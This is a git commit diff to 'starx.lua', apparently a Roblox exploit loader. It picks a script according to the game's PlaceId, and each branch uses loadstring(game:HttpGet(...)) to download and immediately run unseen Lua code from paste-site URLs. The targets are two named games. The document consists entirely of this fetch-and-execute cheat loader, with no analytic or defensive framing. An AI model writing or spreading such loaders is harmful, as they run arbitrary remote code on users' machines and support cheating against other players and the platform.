3521c857d3e07fa2a11d3ebba47663f854f281ca
looted232 <xynconnect@gmail.com>
2026-03-16 20:55:42 -0500

    Add conditional loading for game scripts based on PlaceId

--- starx.lua
+++ starx.lua
@@ -1,1 +1,13 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/VdZoa9141NqriLD6/raw"))()
+local placeId = game.PlaceId
+
+-- SAB script (ID: 109983668079237)
+if placeId == 109983668079237 then
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/QoP8lNVv7b/0"))()
+
+-- Escape Tsunami script (ID: 131623223084840)
+elseif placeId == 131623223084840 then
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/VdZoa9141NqriLD6/raw"))()
+
+else
+    print("Unsupported game")
+end
